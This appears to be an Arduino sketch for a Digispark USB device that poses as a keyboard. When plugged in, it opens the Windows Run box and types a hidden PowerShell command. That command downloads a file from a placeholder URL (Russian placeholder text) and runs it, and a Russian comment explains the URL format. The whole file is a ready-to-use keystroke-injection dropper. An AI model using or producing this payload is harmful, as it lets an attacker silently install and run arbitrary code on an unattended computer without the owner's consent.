#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell -w Hidden -c Invoke-WebRequest -Uri ССЫЛКА_НА_ФАЙЛ_ДЛЯ_СКАЧИВАНИЯ_ИЗ_ИНЕТА -OutFile ПУТЬ_КУДА_КОПИРУЕТСЯ; Start-Process ПУТЬ_ЧТО_ЗАПУСКАЕТСЯ");
  //Ссылка должна оканчиваться на название файла с расширением!! Пример: https://example.com/file.exe
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
}
